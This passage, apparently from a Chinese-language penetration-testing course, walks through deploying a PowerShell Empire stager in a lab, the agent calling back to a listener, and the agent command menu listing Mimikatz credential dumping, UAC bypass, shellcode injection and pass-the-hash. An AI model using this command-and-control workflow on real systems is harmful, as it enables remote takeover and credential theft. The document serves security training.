
> 列表 828 - PowerShell Empire 暂存器

该暂存器是一个 base64 编码的 PowerShell 命令字符串。这个第一阶段载荷将连接到监听器并获取剩余的 Empire 代理代码。

### 23.1.3 Empire 代理

现在我们已经启动了监听器并准备好了暂存器，我们需要在受害主机上部署一个代理。代理仅仅是由暂存器检索到的最终载荷，它允许我们执行命令并与系统交互。暂存器（在本例中为 `.bat` 文件）在执行完成后会自我删除并退出。

一旦代理在目标上运行，它将使用 HTTP GET 和 POST 请求的数据部分与监听器建立 AES 加密通信通道。

我们将首先将 `launcher.bat` 脚本复制到 Windows 10 工作站并从命令提示符中执行它。

```
C:\> C:\Windows\system32\cmd.exe
```

![](img/ec25e59d75726b7041242a56d3376832_723_0.png)

成功执行启动脚本后，一个初始代理呼叫将出现在我们的 Empire 会话中，如列表 829 所示：

```
(Empire: stager/windows/launcher_bat) > [+] Initial agent S2Y5XW1L from 10.11.0.22 now active (Slack)
```

列表 829 - PowerShell Empire 代理连接

接下来，我们可以使用 `agents` 命令显示所有活跃代理。

```
(Empire: stager/windows/launcher_bat) > agents

[*] Active agents:

Name Lang Internal IP Machine Name Username Process Delay

------ ---- ----------- ------------ -------- -------- -----

S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0

(Empire: agents) >
```

列表 830 - PowerShell Empire 代理连接

现在，我们可以使用 `interact` 命令后跟代理名称来与我们的代理交互并执行命令。

在这种情况下，我们将运行 `sysinfo` 以获取有关受控主机的信息（列表 831）。

```
(Empire: agents) > interact S2Y5XW1L

(Empire: S2Y5XW1L) > sysinfo

(Empire: S2Y5XW1L) > sysinfo: 0|http://10.11.0.4:80|corp\offsec|CLIENT251|10.11.0.22|Microsoft Windows 10 Pro|False|powershell|2976|powershell|5

Listener: http://10.11.0.4:80

Internal IP: 10.11.0.22

Username: corp\offsec

Hostname: CLIENT251

OS: Microsoft Windows 10 Pro
```

![](img/ec25e59d75726b7041242a56d3376832_724_0.png)

```
High Integrity:	0

Process Name:	powershell

Process ID:	2976

Language:	 powershell

Language Version: 5

...
```

*清单 831 - 执行 sysinfo 命令*

请注意，该命令不会立即返回。这种延迟是由 `DefaultDelay` 参数引起的，该参数当前设置为默认值五秒。

`help` 命令（清单 832）显示了所有可用命令，例如 `upload`、`download` 和 `screenshot`，这些命令的含义不言自明。此外，我们可以使用 `shell` 执行命令，并使用 `spawn` 在同一主机上创建额外的代理。

```
(Empire: S2Y5XWIL) > help

Agent Commands

===============

agents          Jump to the agents menu.

back            Go back a menu.

bypassuac       Runs BypassUAC, spawning a new high-integrity agent for a listener.

clear           Clear out agent tasking.

creds           Display/return credentials from the database.

download        Task an agent to download a file.

exit            Task agent to exit.

help            Displays the help menu or syntax for particular commands.

info            Display information about this agent

injectshellcode Inject listener shellcode into a remote process. Ex. injectshellcode

jobs            Return jobs or kill a running job.

kill            Task an agent to kill a particular process name or ID.

killdate        Get or set an agent's killdate (01/01/2016).

list            Lists all active agents (or listeners).

listeners       Jump to the listeners menu.

lostlimit       Task an agent to change the limit on lost agent detection

main            Go back to the main menu.

mimikatz       Runs Invoke-Mimikatz on the client.

psinject        Inject a launcher into a remote process. Ex. psinject <listener> <pid>

pth             Executes PTH for a CredID through Mimikatz.

rename          Rename the agent.

resource        Read and execute a list of Empire commands from a file.

revertoself     Uses credentials/tokens to revert token privileges.

sc              Takes a screenshot, default is PNG. Giving a ratio means using JPEG.

scriptcmd       Execute a function in the currently imported PowerShell script.

scriptimport    Imports a PowerShell script and keeps it in memory in the agent.

searchmodule    Search Empire module names/descriptions.

shell           Task an agent to use a shell command.

sleep           Task an agent to 'sleep interval [jitter]'

spawn           Spawns a new Empire agent for the given listener name. Ex. spawn <listener>

stal_token      Uses credentials/tokens to impersonate a token for a given process ID

sysinfo         Task an agent to get system information.

updateprofile   Update an agent connection profile.
```
